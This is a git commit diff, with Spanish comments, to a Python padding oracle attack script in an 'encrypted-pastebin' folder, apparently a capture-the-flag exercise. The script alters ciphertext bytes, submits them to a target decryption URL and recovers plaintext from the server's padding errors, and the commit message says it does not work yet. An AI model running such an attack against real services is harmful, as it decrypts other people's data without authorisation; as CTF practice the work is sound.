3c184901470ac44cbe2eca477ac808a1b523482d
Pablo Daniel Rey <pablodanielrey@gmail.com>
2019-11-26 18:33:42 -0300

    todavia no funciona pero va avanzando.

--- encrypted-pastebin/padding_oracle.py
+++ encrypted-pastebin/padding_oracle.py
@@ -40,7 +40,7 @@ hash_ = memoryview(hash_b)
 decoded_bytes = [0] * len(hash_)
 
 blocks = int(len(hash_) / 16)
-initial_block = 8
+initial_block = 0
 
 print(f"Trabajando con \n {hash_data}")
 print(f"Longitud del hash : {len(hash_data['hash'])}")
@@ -60,43 +60,61 @@ for block_index in range(initial_block, blocks, 1):
     i = block_index * 16
     f = i + 16
     block_data = hash_[i:f]
+    decoded_bytes = memoryview(padding_oracle_data['decoded_bytes'])[i:f]
     working_buffer = memoryview(bytearray(hash_))
+    sending_buffer = working_buffer[:f+16]
     working_block = working_buffer[i:f]
-    decoded_bytes = memoryview(padding_oracle_data['decoded_bytes'][i:f])
 
     print(f'Procesando bloque : {block_index}')
     print(f"Bloque    : {binascii.hexlify(block_data).decode('utf8')}")
     print(f"Working   : {binascii.hexlify(working_block).decode('utf8')}")
+    print(f"To Send   : {binascii.hexlify(sending_buffer).decode('utf8')}")
 
     #para cada uno de los bytes del bloque
-    padding = bytearray(16)
     for b in range(16):
         byte_found = False
         pos = 15 - b
-        padding = b + 1
 
-        print(f'Procesando bloque {block_index} byte {pos} padding {padding}')
+        print(f'Procesando bloque {block_index} byte {pos}')
         padding_oracle_data['working_byte'] = pos
         save_progress(padding_oracle_data)
 
+        #corrijo el padding para el bloque en proceso.        
+        padding = 16 - pos
+        for pad in range(pos,16):
+            working_block[pad] = decoded_bytes[pad] ^ block_data[pad] ^ (padding + 1)
+            print(f"Woking Block con padding : {binascii.hexlify(working_block)}")
+
         # pruebo todos los valores de bytes, ultimo el valor original
         bytes_to_try = [x for x in range(0,block_data[pos])] + [x for x in range(block_data[pos]+1,256)] + [block_data[pos]]
+        tries = 0
         for c in bytes_to_try:
+            if byte_found:
+                break
             if c != block_data[pos]:
                 working_block[pos] = c
-                #print(binascii.hexlify(working_block).decode('utf8'))
+                #print(binascii.hexlify(sending_buffer).decode('utf8'))
                 try:
-                    u.utils.decript_data(url, working_buffer)
+                    u.utils.decript_data(url, sending_buffer)
+                    print(f"Encontrado {c} para {block_index} en la pos {pos}")
                     decoded_bytes[pos] = block_data[pos] ^ working_block[pos] ^ padding
-                    for pad in range(pos,16):
-                        block_data[pos] = decoded_bytes[pad] ^ block_data[pad] ^ (padding + 1)
                     byte_found = True
                     break
+
                 except Exception as e:
+                    tries += 1
+                    sys.stdout.write('.')
+                    sys.stdout.flush()
                     pass
 
         if not byte_found:
             raise Exception(f'No se pudo encontrar solución al bloque {block_index} byte {pos}')
+
+        print(binascii.hexlify(decoded_bytes))
+        try:
+            print(decoded_bytes.decode('utf8'))
+        except Exception:
+            pass
 
     padding_oracle_data['blocks_decoded'].append(block_index)
     save_progress(padding_oracle_data)
